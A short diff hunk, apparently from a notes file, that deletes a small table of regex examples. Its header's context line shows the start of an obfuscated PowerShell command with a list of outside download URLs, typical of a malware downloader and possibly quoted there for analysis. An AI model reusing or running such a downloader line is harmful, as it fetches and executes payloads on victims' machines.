@@ -39,12 +39,6 @@ powershell $BYi='rfd';$iQF='http://mahimamedia.com/YxdW87t@http://mandujano.net/
 
 
 
-| Reg           |                                                                        Defination    |
-| ------------- |                                                                       :-------------:| 
-| ^The          |                                             matches any string that starts with The  |
-| end$          |                                                 matches a string that ends with end  | 
-| (.)..         |              Start with first alphabet in list and skip two alphabet so on so fourth |  
-
 
 
 
